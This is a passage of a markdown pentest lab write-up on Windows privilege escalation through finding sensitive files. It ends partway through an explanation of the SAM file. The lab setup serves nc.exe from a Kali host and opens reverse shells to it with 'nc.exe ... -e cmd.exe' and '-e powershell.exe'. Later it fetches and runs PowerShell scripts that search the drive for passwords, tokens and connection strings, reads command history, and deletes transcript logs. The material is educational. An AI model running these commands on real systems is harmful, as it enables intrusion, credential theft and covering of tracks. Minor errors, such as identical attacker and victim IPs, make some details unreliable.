<h1 align="center"> Windows File With Sensitive Data </h1>


<img width="1024" height="500" alt="Windows File With Sensitive Data" src="https://github.com/user-attachments/assets/d11d4aa7-d728-41d8-8a03-7832f1f2dc2d" />


---

## Scope:
- **Attacker**: Kali Linux (IP `192.168.127.128`)
- **Victim**: Windows 10 (IP ``192.168.127.128``)


---


## Table of Contents

[INTRODUCTION TO WINDOWS FILE WITH SENSITIVE DATA](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#introduction-to-windows-file-with-sensitive-data)

  - [Explain about Files with sensitive data](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#what-is-file-with-sensitive-data)
  - [Common locations of Sensitive Files](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#common-locations-of-sensitive-files)
  - [Why it Important](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#why-it-important)
  - [Common Locations & Simple Search Methods](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#common-locations--simple-search-methods)
  - [Categories of Sensitive Data:](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#categories-of-sensitive-data)
  - [Windows File System](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#windows-file-system)
  - [How These Files Enable Priv Esc](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#how-these-files-enable-priv-esc)


[SETUP LAB](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#setup-lab)

  - [Transfer Netcat & Get Shell from Victim to Kali](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#transfer-netcat--get-shell-from-victim-to-kali)


[WINDOWS FILES WITH SENSITIVE DATA METHODOLOGY](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#windows-files-with-sensitive-data-methodology)

1. [Basic Search Commands](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#1-basic-search-commands)
   - [Using Windows Search (GUI)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#1-using-windows-search-gui)
   - [Windows (CMD)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#2-windows-cmd)
   - [Using PowerShell (Most Effective)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#3-using-powershell-most-effective)

2. [Targeted Search for Specific Data Types](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#2-targeted-search-for-specific-data-types)
   - [Searching for Passwords & Credentials](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#1-searching-for-passwords--credentials)
   - [Configuration Files Search](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#2-configuration-files-search)

3. [History Logs](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#3-history-logs)
   - [History](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#1-history)
   - [Transcript](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#2-transcript)

4.  [Security Accounts Manager (SAM + SYSTEM)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#4-security-accounts-manager-sam--system)
   - [What is SAM?](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#1-what-is-sam)
   - [Automate tool (mimikatz)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#2-automate-tool-mimikatz)
   - [SAM dump with SeBackupPrivilege](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#3-sam-dump-with-sebackupprivilege)

5. [Registry Hives](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/14.%20Files%20with%20Sensitive%20Data.md#5-registry-hives)
  



---



# INTRODUCTION TO WINDOWS FILE WITH SENSITIVE DATA


## Explain about Files with sensitive data

### What is file with sensitive data?
**Files with sensitive Data**: Files containing confidential information that can be exploited for privilege escalation, lateral movement, or credential theft.

Privilege escalation happens when someone gains higher-level access than they should. Files containing sensitive data can unintentionally help attackers do this. Examples include:

- **Password files**: Config files, scripts, or backups that store plaintext or weakly encrypted credentials.
- **Key material**: SSH private keys, API tokens, or certificates left unprotected.
- **System configuration files**: Files like /etc/sudoers on Linux or registry hives on Windows that control permissions.
- **Logs with secrets**: Application logs that accidentally capture passwords, tokens, or session IDs.
- **Backup archives**: Old ZIP/TAR files containing sensitive configs or user data.



### Common locations of **Sensitive Files**:

- Configuration files
- Log files
- Backup files
- Script files
- Database files
- Memory dumps
- Registry exports


### Why it Important
- Users and admins often store passwords, API keys, configuration files, or credentials in plain text.
- These files may be found in:
  - User directories
  - ProgramData
  - Temp folders
  - Application config files
  - Log files
  - Backup files

 
Finding these can give you:
- Local admin credentials → Privilege Escalation
- Domain credentials → Lateral Movement
- Service account passwords → Persistence or further exploitation


## Common Locations & Simple Search Methods
### Where to Look First (Common Locations):
#### User Profile Directories:
````
C:\Users\[Username]\
├── Desktop\
├── Documents\
├── Downloads\
├── AppData\
│   ├── Local\
│   ├── Roaming\
│   └── LocalLow\
└── Saved Games\
````


#### System Directories:
````
C:\Windows\
├── System32\
├── Temp\
├── Panther\ 
├── Debug\
└── Logs\
````


#### Application Directories:
````
C:\Program Files\
C:\Program Files (x86)\
C:\ProgramData\
````




## Categories of Sensitive Data:

### 1. CREDENTIALS & AUTHENTICATION
 ````
   ├── Passwords (plaintext/hashed)
   ├── API Keys & Tokens
   ├── SSH/SSL Private Keys
   ├── Session Cookies
   └── Database Connection Strings
````


### 2. SYSTEM CONFIGURATION
 ````
   ├── Configuration Files
   ├── Registry Backups
   ├── Service Configurations
   └── Policy Files
````


### 3. USER DATA & HISTORY
````
   ├── Browser Data
   ├── Command History
   ├── Recent Documents
   └── Clipboard Data
````


### 4. APPLICATION SPECIFIC
````
   ├── Backup Files
   ├── Log Files
   ├── Cache Files
   └── Dump Files
````


### Windows File System
#### Understand Windows directory structure
````
Get-ChildItem -Path C:\ -Depth 1 | Format-Table Name
````
<img width="852" height="889" alt="image" src="https://github.com/user-attachments/assets/afe56403-cabe-4ff7-902e-529460aee8b9" />

##### Key directories for sensitive data:
| Directory Path         | Description                                              |
| ---------------------- | -------------------------------------------------------- |
| `C:\Users\`            | Stores user profiles                                     |
| `C:\ProgramData\`      | Application data shared by all users                     |
| `C:\Windows\System32\` | Core Windows system files                                |
| `C:\Windows\Temp\`     | Temporary files used by Windows                          |
| `C:\inetpub\`          | Internet Information Services (IIS) web server directory |
| `C:\Windows.old\`      | Backup of a previous Windows installation                |



## How These Files Enable Priv Esc

- **Stored credentials**: If a file contains admin passwords or tokens, an attacker can reuse them to gain elevated access.
- **Misconfigured permissions**: If sensitive files are world-readable or writable, attackers can read secrets or modify configs.
- **Exposed keys**: Private keys without passphrases can allow login as privileged users.
- **Script injection**: If privileged scripts read from insecure files, attackers can tamper with those files to execute malicious commands.



---




# SETUP LAB

- In this first I need to get target shell on kali first

## Transfer Netcat & Get Shell from Victim to Kali:

Use a simple HTTP server to host the binary:

### On attacker (Kali)

- On kali find folder that have `nc.exe`:
````
which nc
````
<img width="266" height="87" alt="image" src="https://github.com/user-attachments/assets/575922ff-6b93-422a-a0f6-b7a02bf8d133" />

- Now we see it stay in `/usr/bin/nc`.

- Or to see detail:
````
whereis nc
````
<img width="497" height="106" alt="image" src="https://github.com/user-attachments/assets/3d9638fc-9387-41ea-a8bd-e6657059633d" />


- Check on kali we have nc.exe or not?
````
find / -iname "nc.exe" 2>/dev/null
````
<img width="523" height="96" alt="image" src="https://github.com/user-attachments/assets/4a7ba6aa-b304-4ac8-bfbb-63039692a13a" />


#### Copy nc.exe to a working folder
````
mkdir -p ~/tools
cp /usr/share/windows-resources/binaries/nc.exe ~/tools
cd ~/tools
ls
````
<img width="630" height="335" alt="image" src="https://github.com/user-attachments/assets/794bc47e-8636-4d32-b6b2-2696dcd8b2fc" />



#### Serve the file from Kali
````
python3 -m http.server 8000
````
<img width="670" height="188" alt="image" src="https://github.com/user-attachments/assets/9c2b6050-6048-4c70-bb07-5e3ed3e61ff3" />



### On Windows:
On the Windows target, we can pull the file down with built‑in tools:
````
curl http://192.168.127.128:8000/nc.exe -o nc.exe
````
<img width="983" height="737" alt="image" src="https://github.com/user-attachments/assets/47366a5c-efe4-4e0c-924d-9fcb437aa57a" />



### Start Listen

#### On kali
````
nc -lvnp 4444
````
<img width="376" height="127" alt="image" src="https://github.com/user-attachments/assets/35d00eba-0f03-4416-a15b-b58aa17e9804" />



#### On windows:
````
.\nc.exe 192.168.127.128 4444 -e cmd.exe
````
<img width="804" height="132" alt="image" src="https://github.com/user-attachments/assets/881d2a36-e6f6-46e2-8a56-39892d75adaf" />

- After back to our attacker:
<img width="772" height="282" alt="image" src="https://github.com/user-attachments/assets/5752546c-487b-41bb-9e4e-af62e661b439" />


- Now we succeed to get shell.


#### If we want to get the victim PowerShell:
````
nc -nvlp 4444
````
<img width="320" height="133" alt="image" src="https://github.com/user-attachments/assets/bbffc7f1-8e81-41c8-a2df-747c89d09e49" />

- After on victim:
````
.\nc.exe 192.168.127.128 4444 -e powershell.exe
````
<img width="953" height="156" alt="image" src="https://github.com/user-attachments/assets/047bd66f-3ac2-40f4-9d11-146a0aeda9d6" />

<img width="718" height="312" alt="image" src="https://github.com/user-attachments/assets/df7ca252-88bb-4451-8009-f92670b969bf" />


- Now we target `powershell`.



---



# WINDOWS FILES WITH SENSITIVE DATA METHODOLOGY


## 1. Basic Search Commands:

### 1. Using Windows Search (GUI):
- First open ``File Explorer`` -> Navigate to target `directory` -> search for:
| File / Location          | Description                           | Why It’s Sensitive                                                     |
| ------------------------ | ------------------------------------- | ---------------------------------------------------------------------- |
| Session IDs              | Session identifiers                   | Can be reused to hijack active user sessions                           |
| `.bak` / `.old` / `.zip` | Backup or archived files              | Often contain full configs or databases with secrets                   |
| `.db` / `.sqlite`        | Database files                        | May store user credentials, API keys, or session data                  |
| `.json`                  | Configuration files                   | Frequently contain API tokens or service credentials                   |
| `.yml` / `.yaml`         | DevOps configuration files            | Commonly store secrets, environment variables, or pipeline credentials |
| `.pem` / `.key` / `.crt` | Cryptographic key & certificate files | Used for authentication and encryption (highly sensitive)              |
| `.ps1` / `.sh` / `.bat`  | Script files                          | May hardcode credentials or run privileged commands                    |
| `.env`                   | Environment variable files            | Often store database passwords and API tokens                          |
| Windows Registry Hives   | `SAM`, `SYSTEM`, `SECURITY`           | Contain password hashes and system secrets                             |
| Linux Shadow File        | `/etc/shadow`                         | Stores password hashes for all local accounts                          |

<img width="1921" height="898" alt="image" src="https://github.com/user-attachments/assets/c1c897e4-9b85-4756-b336-1a5ed405dbea" />



### 2. Windows (CMD)
#### Search for files with specific extensions
````
dir /s /b *.txt
````
<img width="1574" height="799" alt="image" src="https://github.com/user-attachments/assets/ebf897ed-f27b-457e-bca4-3e06fcd9d73a" />


- `dir` command lists files and directories in Windows.
- `/s`: Search all subdirectories recursively.
  - Without `/s`, `dir` only lists files in the current folder.
  - With `/s`, it goes through every folder under the current path.
- `/b`: Use bare format.
  - This means only the full path of each file is shown, no headers, sizes, or summaries.
- `*.txt`: Matches all files ending in `.txt`.




````
dir /s /b *.config
````
<img width="1376" height="152" alt="image" src="https://github.com/user-attachments/assets/ac949974-143c-443d-bae1-b9812ed2bb18" />

- `*.config`: Matches all files ending in `.config`.



````
dir /s /b *.xml
````
<img width="1877" height="675" alt="image" src="https://github.com/user-attachments/assets/b567aad5-016c-4ba5-9efc-80b9a25af486" />

- `*.xml`: Matches all files ending in `.xml`.

- To check what in file has:
````
type C:\Users\k4n0ng\AppData\Local\Diagnostics\460911090\2025122908.000\NetworkDiagnostics.debugreport.xml
````
<img width="1911" height="802" alt="image" src="https://github.com/user-attachments/assets/759b16e1-9f34-4c24-b00e-d64719e0f8f4" />



````
dir /s /b *.ini
````
<img width="1582" height="363" alt="image" src="https://github.com/user-attachments/assets/671bb348-898e-4402-832e-7bfaf4c90326" />

- `*.ini`: Matches all files ending in `.ini`.



#### Search for files containing specific text
````
findstr /s /i "password" *.txt
````
<img width="1919" height="810" alt="image" src="https://github.com/user-attachments/assets/d6c1d617-de53-4084-bd71-f8b1415c2d94" />

````
findstr /s /i "admin" *.config
````
````
findstr /s /i "secret" *.*
````
<img width="1908" height="777" alt="image" src="https://github.com/user-attachments/assets/b9ff18da-35de-4a21-9944-d3108cb19a36" />


- `findstr`: Searches for strings (text patterns) inside files. Similar to grep in Linux.

- **Switches**:
  - `/s`: Search all subdirectories recursively.
  - `/i`: Case‑insensitive search (so “Password”, “PASSWORD”, “password” all match).

- **File Patterns**:
  - `*.txt`: Search all text files.
  - `*.config`: Search all configuration files.
  - `*.*`: Search all files of any type.



### 3. Using PowerShell (Most Effective):

#### Basic file search
````
Get-ChildItem -Path C:\ -Include *.txt, *.config, *.xml, *.ini -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
````
<img width="1487" height="812" alt="image" src="https://github.com/user-attachments/assets/d2f788e2-c453-48b4-889c-76948d399b42" />

- `Get-ChildItem`: Lists files and directories (like dir in cmd).
- `-Path C:\`: Start searching from the root of the C:\ drive.
- `-Include *.txt, *.config, *.xml, *.ini`: Only include files that match these extensions:
  - `.txt`: text files
  - `.config` → configuration files
  - `.xml`: XML files
- `.ini`: initialization files
- ``-Recurse``: Search all subdirectories under C:\ (deep search).
- ``-ErrorAction SilentlyContinue``: Suppresses error messages (e.g., access denied).
- ``| Select-Object FullName``: Output only the full file path for each match.
- This command searches our entire `C:\ drive recursively` for files ending in `.txt`, ``.config``, ``.xml``, or ``.ini``, and then prints only their full paths, while ignoring any errors from restricted folders.


##### To check what have in file:
````
Get-Content C:\Windows\win.ini
Get-Content C:\Windows\Professional.xml
````
<img width="1837" height="810" alt="image" src="https://github.com/user-attachments/assets/9ec4e5ec-25b8-4600-8ff2-f1e69a6e43e1" />

- We use `Get-Content` to check what have in file, like `cat` command in linux.


#### Search for files containing keywords
````
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password", "admin", "secret", "key" | Select-Object Path, LineNumber, Line
````
<img width="1857" height="812" alt="image" src="https://github.com/user-attachments/assets/94e57d97-70d5-4d94-b581-6377b563ac8a" />


- `Get-ChildItem -Path C:\ -Recurse`: Searches through all files and folders on the C:\ drive, including subdirectories.
- `-ErrorAction SilentlyContinue`: Ignores access errors (like restricted folders).
- `Select-String -Pattern "password", "admin", "secret", "key"`: Looks inside each file for those keywords.
- `Select-Object Path, LineNumber, Line`: Shows the file path, the line number, and the actual line where a match was found.

-  This command scans every file on `C:\ for sensitive keywords` (“password”, “admin”, “secret”, “key”) and prints the file path plus the matching line.



---



## 2. Targeted Search for Specific Data Types

### 1. Searching for Passwords & Credentials 


#### Common Password Patterns:

##### Search for password mentions
````
$keywords = @("password", "passwd", "pwd", "secret", "key", "token", "credential", "login", "auth")

foreach ($keyword in $keywords) {
    Write-Host "`nSearching for: $keyword" -ForegroundColor Yellow
    Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt, *.config, *.xml, *.json, *.ps1, *.bat, *.cmd, *.vbs | 
        Select-String -Pattern $keyword | 
        Select-Object -First 20 Path, LineNumber, Line
}
````
<img width="1770" height="819" alt="image" src="https://github.com/user-attachments/assets/eaf721ac-f7ca-4f18-adbf-202c1ab51c71" />

<img width="1831" height="493" alt="image" src="https://github.com/user-attachments/assets/ff90b22b-d5d3-4914-8da7-1b5da199be00" />

<img width="1765" height="779" alt="image" src="https://github.com/user-attachments/assets/daf6accd-087d-45eb-998f-c94038bc326d" />

- This script is used to **audit files for sensitive keywords** (like “password”, “token”, “auth”) across your system. It helps identify places where secrets, credentials, or authentication data might be stored in plaintext inside configuration, script, or text files.
-  it’s a **security auditing tool** to quickly spot potential leaks of sensitive data in files on your computer.



##### Or if we want to generate script:
- On kali:
````
mousepad search_passwd.ps1
````
````
$keywords = @("password", "passwd", "pwd", "secret", "key", "token", "credential", "login", "auth")

foreach ($keyword in $keywords) {
    Write-Host "`nSearching for: $keyword" -ForegroundColor Yellow
    Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt, *.config, *.xml, *.json, *.ps1, *.bat, *.cmd, *.vbs | 
        Select-String -Pattern $keyword | 
        Select-Object -First 20 Path, LineNumber, Line
}
````
<img width="1289" height="344" alt="image" src="https://github.com/user-attachments/assets/e4a895ac-432f-406c-8af9-b0d470918643" />

- Press `Ctrl + S` to save it.

- Open Python HTTP server:
````
python3 -m http.server 4444
````
<img width="647" height="124" alt="image" src="https://github.com/user-attachments/assets/b50e025e-5c9a-49d1-8f07-5c64b295c9b8" />



- On target:
````
curl http://192.168.127.128:4444/search_paswd.ps1 -o search_paswd.ps1
````
<img width="939" height="286" alt="image" src="https://github.com/user-attachments/assets/41881c97-adb4-49a2-99ef-fbf49f29c1b0" />

- After execute it:
````
./search_paswd.ps1
````
<img width="1731" height="805" alt="image" src="https://github.com/user-attachments/assets/88f58778-9944-46ae-9d14-71286acbe2b4" />



#### Search for Connection Strings:

##### # Database connection strings
````
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.config, *.xml, *.json, *.env | 
    Select-String -Pattern "connectionstring", "server=", "database=", "uid=", "user id=", "pwd=", "password=" | 
    Select-Object Path, Line
````
<img width="1745" height="805" alt="image" src="https://github.com/user-attachments/assets/b0637239-89bd-470a-9e5f-5bcf8905a7a9" />

This command **scans configuration files across your C:\ drive for sensitive database connection details** (like server names, usernames, and passwords) and shows you exactly where they appear.

It’s useful for:
- **Security auditing**: Spotting hardcoded credentials.
- **Troubleshooting**: Finding where connection strings are defined.
- **Compliance checks**: Ensuring sensitive data isn’t stored in plaintext configs.

- it’s a PowerShell search tool for locating database connection strings and credentials inside config files.

- Check it:
<img width="1908" height="812" alt="image" src="https://github.com/user-attachments/assets/0cf6d844-19ca-43ac-a127-fee4338f2bce" />



### 2. Configuration Files Search

#### Application Configuration:

##### Search for common config files
````
mousepad Search_conf.ps1
````
````
$configPatterns = @("*config*", "*.ini", "*.cfg", "*.properties", "*.yml", "*.yaml", "*.env", ".env*")

foreach ($pattern in $configPatterns) {
    Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter $pattern | 
        ForEach-Object {
            Write-Host "Checking: $($_.FullName)" -ForegroundColor Cyan
            Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "pass", "key", "secret"
        }
}
````
<img width="797" height="423" alt="image" src="https://github.com/user-attachments/assets/f9eade24-97fe-491a-bd61-c50c750e7ca1" />




- Open Python HTTP server:
````
python3 -m http.server 4444
````
<img width="656" height="129" alt="image" src="https://github.com/user-attachments/assets/781743f6-cbf0-4e24-82a5-e903929ff829" />



- On target:
````
curl http://192.168.127.128:4444/Search_conf.ps1 -o Search_conf.ps1
````
<img width="951" height="287" alt="image" src="https://github.com/user-attachments/assets/5ec7592a-0216-46b0-a98e-202f12abdd7e" />


- Execute:
````
./Search_conf.ps1
````
<img width="953" height="796" alt="image" src="https://github.com/user-attachments/assets/d2c2a33e-8096-4725-91f6-c98d0b3d03de" />


- Now we can config it.



---




## 3. History Logs

### 1. History

#### View History in Memory (Current Session)
````
Get-History
````
<img width="434" height="291" alt="image" src="https://github.com/user-attachments/assets/1751eae0-c9cf-4e18-99de-3fbe1d063b86" />

- ``Get-History``: shows the list of commands we’ve executed in our current PowerShell session, making it easy to review or rerun them.


````
Get-ChildItem C:\Windows
````
<img width="777" height="809" alt="image" src="https://github.com/user-attachments/assets/339a0466-e64b-420e-94f4-e7f67c0d7d12" />

- `Get-ChildItem C:\Windows`: shows us the **top‑level contents of the Windows system directory**.

````
Get-Process
````
<img width="812" height="776" alt="image" src="https://github.com/user-attachments/assets/eec19d0c-c12d-4284-b510-5adb64ff0bbb" />

- `Get-Process` shows us all running processes with their IDs, CPU usage, and memory consumption, making it a handy tool for system monitoring and troubleshooting.


#### Find Where History Is Saved on Disk
````
(Get-PSReadLineOption).HistorySavePath
````
<img width="981" height="103" alt="image" src="https://github.com/user-attachments/assets/6a635cdf-9389-4f3c-93fd-da3af36bc37f" />

- If we want to check it:
````
type C:\Users\k4n0ng\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
````
<img width="1262" height="782" alt="image" src="https://github.com/user-attachments/assets/e2785355-90d4-4108-baeb-9e4ded881654" />

This sequence shows:
- Where PowerShell stores your command history (`ConsoleHost_history.txt`).
- How to view it using `type`.
- The file is basically a log of your past commands, useful for reviewing what you’ve done, reusing commands, or auditing activity.



#### Environment Variables
````
dir env:
````
<img width="1727" height="798" alt="image" src="https://github.com/user-attachments/assets/0fbca153-d344-47ca-a6e3-33e439d7da98" />


- **System configuration**: Tell programs where to find important directories (e.g., ProgramFiles, APPDATA).
- **User context**: Store details about the current user (HOMEPATH, USERNAME, COMPUTERNAME).
- **Execution paths**: Define where Windows looks for executables (Path, PATHEXT).
- **Application settings**: Some apps read variables like PSModulePath or OneDrive to know where to store or load files.




#### Default History File Locations

##### On cmd
````
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
````
- In this we need to run it direct on windows:
<img width="1091" height="815" alt="image" src="https://github.com/user-attachments/assets/88b4f477-4471-4e23-8aab-c52595c51dcf" />


##### On PowerShell
````
Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
````
<img width="1350" height="781" alt="image" src="https://github.com/user-attachments/assets/106791cf-41ce-4918-9166-0e39d13029c7" />

- Now we see all logs.


##### Why this matters for Priv Esc

Attackers look here because users often:
- Run `net user administrator P@ssw0rd123 /add` → reveals password
- Type `curl -u admin:P@ssw0rd https://api.example.com` → reveals credentials
- Use `Get-Credential` → may show username/password combos
- Run scripts or tools that include secrets in arguments
- Forget to clear history after doing something sensitive

> Goal: Find credentials, usernames, API keys, internal IPs, or commands that reveal system configuration.

- Get Credential:
````
Get-Credential
````
<img width="607" height="414" alt="image" src="https://github.com/user-attachments/assets/48519759-ec7b-4683-8204-03a8aa6dd553" />




#### How to Read the History File

##### View entire history
````
Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
````
<img width="1337" height="801" alt="image" src="https://github.com/user-attachments/assets/19af88f2-0c87-4ee5-b202-22a2c179fd27" />



##### Search for keywords like "password", "cred", "admin"
````
Select-String -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Pattern "password|admin|cred|key"
````
<img width="1910" height="855" alt="image" src="https://github.com/user-attachments/assets/0a533686-6089-41e6-bc23-2caf7ddca817" />

````
Get-ChildItem -Path C:\ -Recurse -Filter *keylogger*.exe -ErrorAction SilentlyContinue
````
<img width="1255" height="297" alt="image" src="https://github.com/user-attachments/assets/39ab045f-74a7-4304-92f5-597398a28874" />





### 2. Transcript
#### What Is a Transcript?
A PowerShell transcript is a log file that records:
- Every command you run
- The output of each command
- Errors
- Prompts
- Even if you type a password into a prompt (like ``Read-Host -AsSecureString``), the plain text version may still appear in output depending on how it’s handled.




#### Start a Transcript
````
Start-Transcript -Path "C:\Users\k4n0ng\Desktop\Log.txt"
type type C:\Users\k4n0ng\Desktop\Log.txt
````
<img width="876" height="532" alt="image" src="https://github.com/user-attachments/assets/1b3e57ac-782e-42dd-a1c0-3f3e6e4d79af" />


- This transcript is a session log that captures both your commands and the environment details, making it a powerful tool for tracking, troubleshooting, and documenting your PowerShell work.
- ``Start time``: Exact timestamp when logging began (YYYYMMDDHHMMSS format).
- ``Username``: The account that started the session.
- ``RunAs User``: Confirms if you’re running as yourself or another account.
- ``Machine``: Computer name and Windows version/build.
- ``Host Application``: Path to the PowerShell executable being used.
- ``Process ID``: Unique identifier for the PowerShell process.
- ``PSVersion``: Version of PowerShell (here: 5.1).
- ``PSEdition``: Desktop edition (not Core).
- ``PSCompatibleVersions``: Lists all PowerShell versions your system can run scripts from.
- ``BuildVersion``: Build number of PowerShell itself.
- ``CLRVersion``: Version of the .NET runtime PowerShell depends on.
- ``WSManStackVersion``: Version of WS-Management (used for remoting).
- ``PSRemotingProtocolVersion``: Version of the PowerShell remoting protocol.
- ``SerializationVersion``: Version used when serializing objects for remoting.





#### Stop a Transcript
````
Stop-Transcript
````
<img width="798" height="123" alt="image" src="https://github.com/user-attachments/assets/456d0a88-aeeb-44b6-bd2d-58b80a0d606b" />

- After check it:
````
type type C:\Users\k4n0ng\Desktop\Log.txt
````
<img width="885" height="802" alt="image" src="https://github.com/user-attachments/assets/d668bd27-0242-4b4d-8120-757cfdb310ca" />

<img width="888" height="634" alt="image" src="https://github.com/user-attachments/assets/ec3dcd24-763b-458f-9ca3-b80695c0f48a" />


#### Where to Look for Transcript Files
There’s no default location — it depends on where the user saved it.

But common places to check:
````
C:\Users\<username>\Desktop\
C:\Users\<username>\Documents\
C:\Users\<username>\Downloads\
C:\Windows\Temp\
C:\ProgramData\
````
Also search for files with names like:
````
Log.txt
Transcript.txt
PowerShell_Log.txt
Session.log
Commands.txt
````



#### Search for Transcript Files

##### Search for .txt files containing "transcript" in name
````
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*transcript*" -or $_.Name -like "*log*" } | Select-Object FullName
````
<img width="1847" height="797" alt="image" src="https://github.com/user-attachments/assets/2784586e-ed92-4b95-8903-0ba248371f97" />

- If we want to clearn the Transcripts.


#### Clearing or Preventing Transcripts
````
Stop-Transcript
Remove-Item "C:\Users\Quickemu\Desktop\Log.txt" -Force
````
<img width="1363" height="206" alt="image" src="https://github.com/user-attachments/assets/9f42d2e0-7777-4809-a483-20759a79d79a" />

- Now we was `deleted` this file, and not see now.



---



## 4. Security Accounts Manager (SAM + SYSTEM)

### 1. What is SAM?
SAM (Security Accounts Manager) is a critical system file in Windows that stores local user account credentials — meaning, the usernames and password hashes for users who log in locally to the machine (not domain accounts).


#### What Does the SAM File Store?

The slide lists:

- **Usernames and password hashes**: Not plaintext passwords! Windows stores hashed versions (NTLM or LM hashes) for security. These can be cracked offline if obtained.

- **Account Information**: Things like account status (enabled/disabled), password expiration, lockout info, etc.

- **Security Identifiers (SIDs)**: Unique IDs assigned to every user and group. Used internally by Windows to track permissions and ownership.

- **Group Memberships**: Which groups each user belongs to (e.g., Administrators, Users, Power Users).

> Note: The red ``C — +`` scribble next to this list likely means someone was highlighting or emphasizing this section, perhaps indicating ``Critical Info`` or ``Check these items``.



